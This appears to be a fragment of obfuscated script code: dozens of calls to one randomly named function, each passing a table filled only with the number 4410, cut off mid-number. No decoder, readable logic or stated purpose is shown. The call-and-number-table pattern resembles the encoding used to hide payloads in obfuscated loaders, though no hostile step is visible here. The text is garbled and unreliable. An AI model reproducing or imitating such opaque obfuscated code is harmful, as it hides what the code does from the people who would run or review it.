RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4